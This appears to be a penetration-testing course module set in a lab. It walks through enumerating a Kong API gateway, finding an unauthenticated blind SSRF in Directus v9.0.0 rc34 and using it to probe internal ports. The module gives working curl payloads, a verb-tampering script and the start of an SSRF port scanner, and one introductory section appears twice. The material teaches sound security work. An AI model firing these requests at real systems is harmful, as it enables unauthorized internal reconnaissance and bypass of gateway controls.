##### Server-Side Request Forgery
In this module, we'll present a black-box methodology for testing microservices behind an API gateway, starting with the discovery and exploitation of a Server-Side Request Forgery (SSRF) vulnerability in Directus v9.0.0 rc34. We will use this vulnerability to discover more information about the environment and chain together vulnerabilities to gain remote code execution.

The SSRF was discovered by Offensive Security and disclosed to the Directus team for remediation.

9.1. Getting Started
Before we begin, let's discuss some basic setup and configuration details.

In order to access the API Gateway server, we have created a hosts file entry named "apigateway" on our Kali Linux VM. Make this change with the corresponding IP address on your Kali machine to follow along. Be sure to revert the API Gateway virtual machine from the Labs page before starting your work. The API Gateway box credentials are listed below.

URL	Username	Password
http://apigateway:8000/	-	-
ssh://apigateway	student	studentlab
Table 1 - Setup information

We will be operating from a black-box perspective in this module so we will not use application credentials. However, we can use the SSH credentials to restart services on the remote targets if necessary. With our setup complete, we can begin testing the API environment.

9.2. Introduction to Microservices
With the adoption of Agile1 software development, some development teams have moved away from monolithic web applications in favor of many smaller ("micro") web services. These services provide data to users or execute actions on their behalf.

The term microservice2 can refer to these individual services or to the architectural pattern of decomposing applications into multiple small or single-function modules.

When well-coded, microservices provide the basic required functionality without dependencies. Because of this, developers can create and deploy the individual services independently. Multiple applications or users can leverage the services without having to re-implement functionality.

For example, an e-commerce website might provide individual microservices for Auth, Users, Carts, Products, and Checkout. The developers working on the Products service can update their application without needing to redeploy the entire website. The Products service could even use its own database backend.

An enterprise architect at a Fortune 100 retail organization described their e-commerce platform as "A customer sees our website as a single application but it is actually over 50 products that make up the site."

In this type of environment, microservices are often run in containers and must intercommunicate. Since containers and their IP addresses are ephemeral, they often rely on DNS for service discovery. In a common example, Docker networks created with Compose treat each container's name as their hostname for networking purposes. Applications running in Docker containers can then connect to each other based on those hostnames without needing to include IP addresses in their configurations. There are many other software solutions that can aid in service discovery by acting as a service registry but we will not go in to those details here.

Each microservice module exposes its functionality via an API. When an API is exposed over HTTP or HTTPS, it is called a web service. There are two common types of web services: SOAP3 and RESTful.4 We'll focus on the more-common RESTful web services in this module.

Developers often use the terms web service, microservice, web API, and API interchangeably when referring to web services.

Rather than expose microservices directly on the Internet, an API gateway5 acts as a single point of entry to the service. Since API gateways often provide controls (such as authentication, rate limiting, input validation, TLS, etc), the microservices often do not implement those controls independently. In these cases, if we can somehow bypass the API gateway, we could subvert these controls or even call backend services without authenticating.

However, before we jump in to potential attack vectors, let's take some time to discuss web service URL formats, which will provide a baseline for service enumeration.

API gateways can also implement security controls (such as input validation or TLS). While an API gateway may require HTTPS traffic from external connections, sometimes they are configured to terminate encrypted traffic and use cleartext HTTP when they send data to internal services, as that traffic traverses what is considered an internal or trusted network.

1
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Agile_software_development ↩︎

2
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Microservices ↩︎

3
(Wikipedia, 2021), https://en.wikipedia.org/wiki/SOAP ↩︎

4
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Representational_state_transfer#Applied_to_web_services ↩︎

5
(Chris Richardson, 2020) https://microservices.io/patterns/apigateway.html ↩︎

9.2.1. Web Service URL Formats
Each API gateway routes requests to service endpoints in different ways, but URLs are often analyzed with regular expressions. For example, an API gateway might be configured to send any URI that starts with /user to a specific service. The service itself would be responsible for determining the difference between something like /user and /user/new.

There are a variety of RESTful web service URL formats and we'll cover a few of them.

Let's start by examining a sample call from Best Buy's APIs.1

Figure 1: Example API call to Best Buy's Products API
Figure 1: Example API call to Best Buy's Products API
The Products API has an API-specific subdomain. This is followed by "v1". APIs will often have some way to call a specific "version" to allow for changes without breaking existing integrations. In this case, the versioning is specified in the URL. This is a common design pattern, but there are others.2

The next part of the URL is "products", which is the service called in this example. Following that is "8880044.json", which denotes the requested SKU and data format.

Depending on the API, we can often request different data formatting, such as XML or JSON, by changing the value in the "Accept" header on an HTTP request. However, some APIs will ignore this header and always return data in one format.

Next, let's examine an API with a different setup, specifically the API for haveibeenpwned.com.3

GET https://haveibeenpwned.com/api/v3/{service}/{parameter}
Listing 1 - Basic format of Have I Been Pwned's API

Unlike our previous example, this API is called from the main domain. The URL contains "api" in the path, followed by the version number. Next, the URL path includes a service name and a parameter.

Finally, let's check out GitHub's API URL format.4

https://api.github.com/users/octocat
Listing 2 - Sample GitHub API URL

GitHub hosts their APIs on a subdomain. There is no versioning in the URL path. Instead, the API provides a default version unless one is specified in a request header.

By default, all requests to https://api.github.com receive the v3 version of the REST API. We encourage you to explicitly request this version via the Accept header.

The remainder of the URL path follows the pattern of a service (or resource) and a parameter, in this case "users" and "octocat", respectively.

Not every web service we encounter will match these patterns and we cannot review every possible format. However, these examples provide a generalized understanding of web service URL patterns that can help us with testing web services.

1
(Best Buy, 2021), https://bestbuyapis.github.io/api-documentation/#create-your-first-query ↩︎

2
(Troy Hunt, 2014), https://www.troyhunt.com/your-api-versioning-is-wrong-which-is/ ↩︎

3
(Troy Hunt, 2021), https://haveibeenpwned.com/API/v3#Authorisation ↩︎

4
(GitHub Inc, 20201), https://docs.github.com/en/rest/overview/resources-in-the-rest-api ↩︎

9.3. API Discovery via Verb Tampering
RESTful APIs often tie functionality to HTTP request methods,1 or verbs. In other words, a service might have one URL but perform different actions based on an HTTP request's method. An HTTP request sent with the GET method is meant to retrieve data or an object. This method is sometimes referred to as a safe method since it should not modify the state of an object. However, applications can intentionally break this pattern.

As if the terminology used for web services wasn't confusing enough, a method can also refer to an individual operation in a SOAP web service. For example, "lookupUser" and "updateUser" might be individual methods of a Users SOAP web service. All SOAP requests are usually sent with an HTTP POST request.

A POST request usually creates a new object or new data. A PUT or PATCH request updates the data of an existing object. Applications might handle these two verbs differently, but a PUT request usually updates an entire object while a PATCH request updates a subset of an object.

Finally, a DELETE request deletes an object. Alternatively, some web services may handle a delete operation in a POST request coupled with certain parameters.

It is important to remember that all of this is application-specific. A RESTful web service might not implement everything according to the REST standard. Additionally, a service endpoint might not support every HTTP method. We need to keep this in mind as we interact with unknown web services. Regular enumeration tools normally send GET requests. These tools might miss API endpoints that do not respond to GET requests.

1
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Request_methods ↩︎

9.3.1. Initial Enumeration
Armed with a foundational understanding of web service URL formats, let's discuss service discovery. We'll begin by sending an HTTP request to our API gateway server with curl.

kali@kali:~$ curl -i http://apigateway:8000
HTTP/1.1 404 Not Found
Date: Thu, 25 Feb 2021 14:58:05 GMT
Content-Type: application/json; charset=utf-8
Connection: keep-alive
Content-Length: 48
X-Kong-Response-Latency: 1
Server: kong/2.2.1

{"message":"no Route matched with those values"}
Listing 3 - An HTTP response from the API Gateway

The server responded with a 404 Not Found and included the Server header with a value of "kong/2.2.1". A Google search suggests we are likely dealing with Kong Gateway version 2.2.1.1 According to the documentation,2 it has an Admin API that runs on port 8001. However, an attempt to access that port fails.

kali@kali:~$ curl -i  http://apigateway:8001
curl: (7) Failed to connect to apigateway port 8001: Connection refused
Listing 4 - Attempting to access the Kong Admin API.

We will come back to the Kong Admin API later in the module. For now, let's try to find some valid API endpoints on the server by running gobuster. We are using gobuster because it will show us results based on a configurable list of HTTP status codes. An API might return an HTTP 405 Method Not Allowed response to a GET request. Configuring gobuster to display such a response can help us identify API endpoints that are valid but do not allow GET requests. We'll use the dir command to bruteforce directories, -w to define the wordlist, and -u to define the URL. We'll also pass in a custom list of status codes with the -s flag, adding 405 and 500 to the default list. This scan may take several minutes to complete.

kali@kali:~$ gobuster dir -u http://apigateway:8000 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -s "200,204,301,302,307,401,403,405,500" -b ""
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://apigateway:8000
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Status codes:   200,204,301,302,307,401,403,405,500
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/25 09:59:59 Starting gobuster
===============================================================
/files (Status: 403)
/fileschanged (Status: 403)
/userscripts (Status: 403)
/filescan (Status: 403)
/files2 (Status: 403)
/filesystem (Status: 403)
/filesharing (Status: 403)
/usersguide (Status: 403)
/filesystems (Status: 403)
/usersamples (Status: 403)
/rendering-arbitrary-objects-with-nevow-cherrypy (Status: 401)
/filesharing_microsoft (Status: 403)
/filesfoldersdisks (Status: 403)
/usersdomains (Status: 403)
/files-needed (Status: 403)
/renderplain (Status: 401)
/userscience (Status: 403)
/files_and_dirs (Status: 403)
/filesearchen (Status: 403)
/render (Status: 401)
/users_watchdog (Status: 403)
/filescavenger (Status: 403)
/filescavenger-811-421200 (Status: 403)
/filescavban (Status: 403)
/filescavenger-803-406688 (Status: 403)
/filescavenger-803-404384 (Status: 403)
/filesizeicon (Status: 403)
/users-ironpython (Status: 403)
/render_outline_to_html (Status: 401)
===============================================================
2021/02/25 10:10:13 Finished
===============================================================
Listing 5 - Running gobuster on the target server

This returns quite a few results. Most of them are 403 Forbidden, but there are a few 401 Unauthorized. Even though we didn't get any 200 OK responses, the responses we did get can tell us about the environment we're testing. These responses may indicate valid API endpoints that require authentication. Let's store them in a text file so we can use the results in other tools, such as Burp Suite. We'll copy and paste them into a text file, sort them alphabetically, remove the status codes, remove the leading forward slash, and save the results to a new text file.

kali@kali:~$ sort endpoints.txt | cut -d" " -f1 | cut -d"/" -f2 > endpoints_sorted.txt 

kali@kali:~$ cat endpoints_sorted.txt
files2
files_and_dirs
filescan
filescavban
filescavenger-803-404384
filescavenger-803-406688
filescavenger-811-421200
filescavenger
fileschanged
filesearchen
filesfoldersdisks
filesharing_microsoft
filesharing
filesizeicon
files-needed
files
filesystems
filesystem
rendering-arbitrary-objects-with-nevow-cherrypy
render_outline_to_html
renderplain
render
usersamples
userscience
userscripts
usersdomains
usersguide
users-ironpython
users_watchdog
Listing 6 - Sorted results

Let's get these results into Burp Suite. We could have proxied gobuster through Burp Suite during the initial discovery scan, but that would have filled the HTTP history tab with lots of extraneous data. Now that we have a shorter list of endpoints we are interested in, we can run gobuster again using the sorted endpoints as our wordlist, and proxy the calls through Burp Suite with the --proxy flag once Burp Suite is running.

kali@kali:~$ gobuster dir -u http://apigateway:8000 -w endpoints_sorted.txt --proxy http://127.0.0.1:8080
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://apigateway:8000
[+] Threads:        10
[+] Wordlist:       endpoints_sorted.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] Proxy:          http://127.0.0.1:8080
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/25 10:28:08 Starting gobuster
===============================================================
...
===============================================================
2021/02/25 10:28:09 Finished
===============================================================
Listing 7 - Proxying gobuster through Burp Suite

Let's start analyzing the results by clicking on Status to sort them by status code.

Figure 2: Initial enumeration results in Burp Suite
Figure 2: Initial enumeration results in Burp Suite
We have four results that returned 401 Forbidden responses. In fact, those four responses are almost identical, and only the value in the X-Kong-Response-Latency header changes.

HTTP/1.1 401 Unauthorized
Date: Thu, 25 Feb 2021 15:28:08 GMT
Content-Type: application/json; charset=utf-8
Connection: close
WWW-Authenticate: Key realm="kong"
Content-Length: 45
X-Kong-Response-Latency: 0
Server: kong/2.2.1

{
  "message":"No API key found in request"
}
Listing 8 - Sample HTTP 401 response

Based on the /render URL paths prefix and the response body content, the API gateway might be routing these four requests to the same backend service. All four responses included a WWW-Authenticate header with a value of Key realm="kong", which means we will likely need some kind of API key to call this service.

The responses for URL paths prefixed with /users and /files are very similar. They return HTTP 403 Forbidden responses with slight length variations. Let's examine one of the responses for a request starting with /users.

HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Content-Length: 131
Connection: close
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"83-QQac6ttqCuyHQKqtWPBHLcfwFfM"
Date: Thu, 25 Feb 2021 15:28:09 GMT
X-Kong-Upstream-Latency: 93
X-Kong-Proxy-Latency: 0
Via: kong/2.2.1

{"errors":[{"message":"You don't have permission to access the \"directus_users\" collection.","extensions":{"code":"FORBIDDEN"}}]}
Listing 9 - Sample HTTP 403 Forbidden response

These responses provide us some additional information. We notice the X-Powered-By header with the "Directus" value and an error message: "You don't have permission to access the "directus_users" collection". The common value in the URL for these requests is /users.

The response for URL paths starting with /files generates a slightly different error message (referencing the "directus_files" collection), but are otherwise identical.

Based on the X-Powered-By server header, we are dealing with a Directus application.3 A quick online search reveals that Directus is "an instant app and API for your SQL database." This information will prove useful later on but we will continue assessing this server from a black box perspective.

From our initial list of 29 URLs, we seem to have three distinct endpoints: files, users, and render. Let's save these three endpoints in a new file named endpoints_simple.txt.

Exercise
Repeat the steps so far.

1
(Kong Inc, 2021), https://konghq.com/kong/ ↩︎

2
(Kong Inc, 2021), https://docs.konghq.com/gateway-oss/2.3.x/admin-api/ ↩︎

3
(Monospace Inc, 2020), https://directus.io/ ↩︎

##### Advanced Enumeration with Verb Tampering
Now that we have three potential API services, let's do another round of enumeration. URLs for RESTful APIs often follow a pattern of <object>/<action> or <object>/<identifier>. We might be able to discover more services by taking the list of endpoints we have already identified and iterating through a wordlist to find valid actions or identifiers.

We also need to keep in mind that web APIs might respond differently based on which HTTP request method we use. For example, a GET request to /auth might return an HTTP 404 response, while a POST request to the same URL returns an HTTP 200 OK on a valid login or an HTTP 401 Unauthorized on an invalid login attempt.

We can use the varying HTTP method response codes to identify more API endpoints. Gobuster can be configured to send HTTP methods other than GETs, but it will use the configured HTTP method on all requests. It does not send multiple HTTP methods in the same scan. In other words, if we configure it to send POST requests, Gobuster will only send POST requests and will not send GET requests. If we want to send different HTTP request methods to an endpoint and compare the response codes, we will need a different tool.

Let's create a Python script that will send requests with different HTTP methods to a list of endpoints. The script will iterate through the endpoints and check the response codes for each request. The script will print out any endpoint that has a response other than 401, 403, or 404.

We will start our script with the shebang1 and two import statements. We will use argparse to handle input arguments and requests to handle sending the HTTP requests. We'll save the final script to a file named route_buster.py.

#!/usr/bin/env python3

import argparse
import requests
Listing 10 - Import statements

Next, we need to define argument parsing and handling. We need one argument for the target host. Our script will be using two word lists: one for objects (or base endpoints) and another argument for actions. We'll add two more arguments for our wordlists.

parser = argparse.ArgumentParser()
parser.add_argument('-a','--actionlist', help='actionlist to use')
parser.add_argument('-t','--target', help='host/ip to target', required=True)
parser.add_argument('-w','--wordlist', help='wordlist to use')
args = parser.parse_args()
Listing 11 - Handling arguments

Our script will need to iterate through the entire "actionlist" for each endpoint in the wordlist. While not strictly important, we can avoid reading the "actionlist" file repeatedly by reading it once and keeping it in memory as a list.

actions = []

with open(args.actionlist, "r") as a:
    for line in a:
        try:
            actions.append(line.strip())
        except:
            print("Exception occurred")
Listing 12 - Storing the actionlist file contents in memory

Our final step is to send the requests and inspect the response codes. We will need to iterate through the endpoint wordlist, construct the URLs we want to request, and send the requests. The script will print out any URL that generated a response other than 204, 401, 403, or 404.

print("Path                - \tGet\tPost")
with open(args.wordlist, "r") as f:
    for word in f:
        for action in actions:
            print('\r/{word}/{action}'.format(word=word.strip(), action=action), end='')
            
            url = "{target}/{word}/{action}".format(target=args.target, word=word.strip(), action=action)
            
            r_get = requests.get(url=url).status_code
            r_post = requests.post(url=url).status_code

            if(r_get not in [204,401,403,404] or r_post not in [204,401,403,404]):
                print('                    \r', end='')
                print("/{word}/{action:10} - \t{get}\t{post}".format(word=word.strip(), action=action, get=r_get, post=r_post))

print('\r', end='')
print("Wordlist complete. Goodbye.")
Listing 13 - route_buster.py

Next, let's focus on our two wordlists. We'll use the discovered endpoints as the objects list, and one of dirb's wordlists as the second list. Currently, the script will only send GET and POST requests. We might be missing endpoints by omitting PUT, PATCH, and DELETE requests but we are trying to strike a balance between speed, noise, and effectiveness. Depending on the results of the script, we may need to revisit the decision to exclude those methods.

Let's run the script against the target server. It may take several minutes to complete.

kali@kali:~$ ./route_buster.py -a /usr/share/wordlists/dirb/small.txt -w endpoints_simple.txt -t http://apigateway:8000
Path                -   Get     Post
/files/import     -     403     400
/users/frame      -     200     404
/users/home       -     200     404
/users/invite     -     403     400
/users/readme     -     200     404
/users/welcome    -     200     404
/users/wellcome   -     200     404
Wordlist complete. Goodbye.
Listing 14 - Results of the route_buster.py script

While we had several 200 OK responses to the GET requests, those URLs don't respond with anything interesting when loaded in a browser. However, we do have two interesting results from the script. When the script sent POST requests to /files/import and /users/invite, the server responded with HTTP 400 Bad Request instead of HTTP 403 Forbidden.

Let's focus on the /files/import endpoint first and send a POST request to it using curl. We will set the -i flag to include the server headers on the response in the output.

kali@kali:~$ curl -i -X POST http://apigateway:8000/files/import
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Content-Length: 86
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"56-egVc9WbgXViwv0ZIaPJS4bmcvSo"
Date: Thu, 25 Feb 2021 16:06:54 GMT
X-Kong-Upstream-Latency: 26
X-Kong-Proxy-Latency: 0
Via: kong/2.2.1

{"errors":[{"message":"\"url\" is required","extensions":{"code":"INVALID_PAYLOAD"}}]}
Listing 15 - Response for a POST request to /files/import

We seem to have found an API endpoint that we can interact with (even though we have not authenticated) and it provides usage information. The error message states that a "url is required". This is a promising lead. Any time we discover an API or web form that includes a url parameter, we always want to check it for a Server-Side Request Forgery vulnerability. We'll discuss this in the next section.

Exercise
Recreate the steps in this section.

Extra Mile
Expand the route_buster.py script to include PUT and PATCH methods.
Investigate the /users/invite endpoint. What information are we missing to make a valid request?
1
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Shebang_(Unix) ↩︎

9.4. Introduction to Server-Side Request Forgery
Server-Side Request Forgery (SSRF) occurs when an attacker can force an application or server to request data or a resource. Since the request is originating at the server, it might be able to access data that the attacker cannot access directly. The server may also have access to services running on localhost interfaces or other servers behind a firewall or reverse proxy.

The impact of an SSRF vulnerability depends on what data it can access and whether the SSRF returns any resulting data to the attacker. However, SSRF vulnerabilities can be especially effective against microservices. As we previously discussed, microservices will often have fewer security controls in place if they rely upon an API gateway or reverse proxy to implement those controls. If the microservices are in a flat network, we could use an SSRF vulnerability to make one microservice talk directly to another microservice. Any controls enforced by the API gateway would not apply to the traffic between the two microservices, allowing an SSRF exploit to gather information about the internal network and open new attack vectors on that network.

1
(Wikipedia, 2021), https://en.wikipedia.org/wiki/Shebang_(Unix) ↩︎

9.4. Introduction to Server-Side Request Forgery
Server-Side Request Forgery (SSRF) occurs when an attacker can force an application or server to request data or a resource. Since the request is originating at the server, it might be able to access data that the attacker cannot access directly. The server may also have access to services running on localhost interfaces or other servers behind a firewall or reverse proxy.

The impact of an SSRF vulnerability depends on what data it can access and whether the SSRF returns any resulting data to the attacker. However, SSRF vulnerabilities can be especially effective against microservices. As we previously discussed, microservices will often have fewer security controls in place if they rely upon an API gateway or reverse proxy to implement those controls. If the microservices are in a flat network, we could use an SSRF vulnerability to make one microservice talk directly to another microservice. Any controls enforced by the API gateway would not apply to the traffic between the two microservices, allowing an SSRF exploit to gather information about the internal network and open new attack vectors on that network.

9.4.1. Server-Side Request Forgery Discovery
Let's determine if this application contains SSRF.

After fuzzing the APIs, we have identified that /files/import returned an error message that indicates we need to include a url parameter.

{"errors":[{"message":"\"url\" is required","extensions":{"code":"INVALID_PAYLOAD"}}]}
Listing 16 - Error message response from /files/import

As we mentioned, we always want to check url parameters in an API or web form for an SSRF vulnerability. First, let's determine if we can make it connect back to our Kali machine. We'll need to make sure our Apache HTTP server is running.

Since the server returned the error as a JSON message, let's make our POST request use JSON as well. We will use a distinct file name on the url parameter so it is easy to find in our Apache log file. At this point, we don't care if the file actually exists on our Kali host, we just want to determine if the API server will request the file from our web server.

Let's send our payload using curl. We will set -H "Content-Type: application/json" to include a Content-Type header with the "application/json" value on our request and the -d flag with our JSON payload.

kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://192.168.118.3/ssrftest"}' http://apigateway:8000/files/import
HTTP/1.1 500 Internal Server Error
Content-Type: application/json; charset=utf-8
Content-Length: 108
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"6c-qz7bVW5hKPsQy2fT0mRPx8X4tuc"
Date: Thu, 25 Feb 2021 16:18:24 GMT
X-Kong-Upstream-Latency: 118
X-Kong-Proxy-Latency: 1
Via: kong/2.2.1

{"errors":[{"message":"Request failed with status code 404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
Listing 17 - Attempting an SSRF exploit

We receive an HTTP 500 response with a message of "Request failed with status code 404". Let's check our Apache log for any requests.

kali@kali:~$ sudo tail /var/log/apache2/access.log
192.168.120.135 - - [25/Feb/2021:11:18:24 -0500] "GET /ssrftest HTTP/1.1" 404 455 "-" "axios/0.21.1"
Listing 18 - Verifying the SSRF worked in our Apache log file

Excellent. This backend service is vulnerable to SSRF. The user agent on the request is Axios,1 an HTTP client for Node.js. Let's add a file named ssrftest to our Apache web root so that the server can access it and then resend the request with curl.

kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://192.168.118.3/ssrftest"}' http://apigateway:8000/files/import
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Content-Length: 102
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"66-OPr7zxcJy7+HqVGdrFe1XpeEIao"
Date: Thu, 25 Feb 2021 16:22:52 GMT
X-Kong-Upstream-Latency: 117
X-Kong-Proxy-Latency: 0
Via: kong/2.2.1

{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}
Listing 19 - Resending the request with a valid file

We received an HTTP 403 Forbidden response with an error message of "You don't have permission to access this". However, when we check our Apache log file, we can verify the application did send a request and our Apache server returned an HTTP 200 OK.

kali@kali:~$ sudo tail /var/log/apache2/access.log
192.168.120.135 - - [25/Feb/2021:11:18:24 -0500] "GET /ssrftest HTTP/1.1" 404 455 "-" "axios/0.21.1"
192.168.120.135 - - [25/Feb/2021:11:22:52 -0500] "GET /ssrftest HTTP/1.1" 200 230 "-" "axios/0.21.1"
Listing 20 - Apache returned a 200

We definitely have an unauthenticated SSRF vulnerability, but the server does not return the result of the forged request. This is often referred to as a blind SSRF vulnerability.

Exercise
Recreate the steps above.

1
(John Jakob Sarjeant, 2020), https://axios-http.com/ ↩︎

##### Source Code Analysis
Before we continue with our attack, let's review the source code since Directus is open source. While we are approaching this module from a black box perspective, it is still important to understand what is happening in the application's code that allows this vulnerability. We want to be able to take what we've learned about this particular vulnerability and apply it to other applications by understanding the root cause of this bug.

The source code referenced in this section is also available on the Wiki VM.

Let's start with authentication. The authentication handler is defined in /api/src/middleware/authenticate.ts. The relevant code is on lines 12 through 21.1

12  const authenticate: RequestHandler = asyncHandler(async (req, res, next) => {
13    req.accountability = {
14      user: null,
15      role: null,
16      admin: false,
17      ip: req.ip.startsWith('::ffff:') ? req.ip.substring(7) : req.ip,
18      userAgent: req.get('user-agent'),
19    };
20  
21    if (!req.token) return next();
22  
23    if (isJWT(req.token)) {
Listing 21 - Code excerpt from Directus authentication handler

On lines 13 through 19, the function creates a new accountability object on the request. Notably, the user and role variables are set to null. The function then checks if there is a token on the request object. If there is no token, the function returns next(), which passes execution on to the next middleware function.

If we make a request without a token, the authentication handler will create the default accountability object and then pass execution to the next middleware function without throwing an error.

Next, let's review the code for the files controller defined in /api/src/controllers/files.ts.2 The relevant code starts on line 138.

138  router.post(
139    '/import',
140    asyncHandler(async (req, res, next) => {
141      const { error } = importSchema.validate(req.body);
142  
143      if (error) {
144        throw new InvalidPayloadException(error.message);
145      }
146  
147      const service = new FilesService({
148        accountability: req.accountability,
149        schema: req.schema,
150      });
Listing 22 - Code excerpt from Directus files controller

The function starts by validating the request body and throwing an error if the body is invalid. Next, the code creates a FileService object with the accountability object created by the authentication handler. Although we won't inspect the code of the FileService object, the constructor merely stores the accountability object.

152      const fileResponse = await axios.get<NodeJS.ReadableStream>(req.body.url, {
153        responseType: 'stream',
154      });
155  
156      const parsedURL = url.parse(fileResponse.request.res.responseUrl);
157      const filename = path.basename(parsedURL.pathname as string);
158  
159      const payload = {
160        filename_download: filename,
161        storage: toArray(env.STORAGE_LOCATIONS)[0],
162        type: fileResponse.headers['content-type'],
163        title: formatTitle(filename),
164        ...(req.body.data || {}),
165      };
Listing 23 - Second code excerpt from Directus files controller

On line 152, the function uses the axios library to request the value submitted in the url parameter. The code stores the results of the request in the fileResponse variable. At this point, the code has not checked if the initial request to the files controller contained a valid JSON web token (JWT).

167      const primaryKey = await service.upload(fileResponse.data, payload);
168  
169      try {
170        const record = await service.readByKey(primaryKey, req.sanitizedQuery);
171        res.locals.payload = { data: record || null };
172      } catch (error) {
173        if (error instanceof ForbiddenException) {
174          return next();
175        }
176  
177        throw error;
178      }
179  
180      return next();
181    }),
182    respond
183  );
Listing 24 - Third code excerpt from Directus files controller

We don't encounter any authentication checks until code execution reaches line 170. We won't review all of the remaining code. To summarize, the readByKey() function of FileService is responsible for checking authorization. FileService inherits the readByKeys() function from ItemService. The processAST() function defined in /api/src/services/authorization.ts handles authorization.

Since the application downloads the contents of the submitted URL before checking authorization for the storage and retrieval of those contents, the application is vulnerable to unauthenticated blind SSRF. Authenticated users would likely be able to use the files import functionality and access the retrieved data.

Extra Mile
Review the source code for /users/invite. Determine why it cannot be exploited.

1
(GitHub, 2021), https://github.com/directus/directus/blob/v9.0.0-rc.34/api/src/middleware/authenticate.ts ↩︎

2
(GitHub, 2021), https://github.com/directus/directus/blob/v9.0.0-rc.34/api/src/controllers/files.ts ↩︎

##### Exploiting Blind SSRF in Directus
Since we cannot access the results of the SSRF, how can we use it to further our attack? As we have already demonstrated, the application returns different messages for valid files and non-existing files. We can use these different messages to infer if a resource exists.

As a reminder, we receive an HTTP 403 Forbidden when we request a valid resource and an HTTP 500 Internal Server Error with "Request failed with status code 404" when we request a resource that doesn't exist.

Let's check if we can use the SSRF to force Directus to connect to itself. If we send a localhost URL, the application should attempt to connect to its own server. Since such a request originates from the server, we would be able to use such a payload to access ports listening only on localhost.

Let's try it out by sending a url value of "http://localhost:8000/".

kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://localhost:8000/"}' http://apigateway:8000/files/import
HTTP/1.1 500 Internal Server Error
Content-Type: application/json; charset=utf-8
Content-Length: 108
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"6c-MCdMjU9mfpVtWiLKyczhTW/6Xqo"
Date: Thu, 25 Feb 2021 16:34:32 GMT
X-Kong-Upstream-Latency: 27

{"errors":[{"message":"connect ECONNREFUSED 127.0.0.1:8000","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}
Listing 25 - Exploiting SSRF with localhost

We received an error that the connection was refused. This new error message is interesting. We know port 8000 is open externally on the API Gateway server. However, if Directus is running on a different server behind the API gateway, "localhost" would refer to the server running Directus, not the server running Kong API Gateway.

A quick Google search reveals that the default port for Directus is 8055. Let's try out that port on localhost.

kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://localhost:8055/"}' http://apigateway:8000/files/import
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Content-Length: 102
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"66-OPr7zxcJy7+HqVGdrFe1XpeEIao"
Date: Thu, 25 Feb 2021 16:35:58 GMT
X-Kong-Upstream-Latency: 35
X-Kong-Proxy-Latency: 1
Via: kong/2.2.1

{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}
Listing 26 - Exploiting SSRF with localhost port 8055

The server returned the "FORBIDDEN" error code, so we did request a valid resource. We can easily verify that TCP port 8055 is closed externally on the Kong API Gateway server. We are likely dealing with two or more servers in this scenario.

Figure 3: Server diagram
Figure 3: Server diagram
This example proves we can leverage the SSRF vulnerability to discover more information about the internal network.

Exercises
Repeat the steps above.
Use the SSRF vulnerability to access a non-HTTP service running on your Kali host. What is the result? How might this be useful?
Try to identify more error messages. What happens if you request an invalid IP address?
9.4.4. Port Scanning via Blind SSRF
Even though we can't access the results of the SSRF vulnerability, we can still use the different HTTP response codes and error messages to determine if we've requested a valid resource. We can use this information to write a script that will exploit the SSRF vulnerability and act as a port scanner.

Rather than scan every single port, we will start with a small list of common services and HTTP ports. Any port scanning through an SSRF vulnerability is going to take longer than a dedicated tool, such as Nmap. Therefore, we want to limit our initial attempts to common ports to speed up our scan. If the initial results are negative, we can expand the range of ports with subsequent scans.

Let's create a new file named ssrf_port_scanner.py for our next script. We will again start with the shebang and imports.

#!/usr/bin/env python3

import argparse
import requests
Listing 27 - SSRF port scanner imports

Next, we will define our arguments and parse them. We will need an argument for the host vulnerable to SSRF and an argument for the host or IP address we want to load with the SSRF. We'll include a timeout argument so we can account for any network latency. Finally, we'll add a verbose argument for greater control of script output.

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', help='host/ip to target', required=True)
parser.add_argument('--timeout', help='timeout', required=False, default=3)
parser.add_argument('-s','--ssrf', help='ssrf target', required=True)
parser.add_argument('-v','--verbose', help='enable verbose mode', action="store_true", default=False)

args = parser.parse_args()
Listing 28 - SSRF port scanner arguments

